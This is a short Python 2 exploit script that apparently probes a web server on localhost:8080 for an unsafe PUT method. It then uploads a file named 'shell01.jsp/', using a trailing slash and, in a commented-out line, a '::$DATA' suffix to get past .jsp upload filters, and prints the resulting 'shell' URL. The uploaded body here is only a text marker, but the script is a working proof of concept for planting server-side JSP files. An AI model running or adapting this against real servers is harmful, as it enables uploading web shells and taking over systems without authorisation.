# coding:utf-8
import httplib

import sys

import time

locurl = 'localhost:8080'

body = '''swm love nuonuo!'''

try:

    conn = httplib.HTTPConnection(locurl)

    conn.request(method='OPTIONS', url='/ffffzz')

    headers = dict(conn.getresponse().getheaders())

    if 'allow' in headers and headers['allow'].find('PUT') > 0:

        conn.close()

        conn = httplib.HTTPConnection(locurl)

        url = "/" + 'shell01' + '.jsp/'

        # url = "/" + str(int(time.time()))+'.jsp::$DATA'

        conn.request(method='PUT', url=url, body=body)

        res = conn.getresponse()

        if res.status == 201:

            # print 'shell:', 'http://' + sys.argv[1] + url[:-7]

            print 'shell:', 'http://' + locurl + url[:-1]

        elif res.status == 204:

            print 'file exists'

        else:

            print 'error'
        conn.close()
    else:

        print 'Server not vulnerable'

except Exception, e:

    print 'Error:', e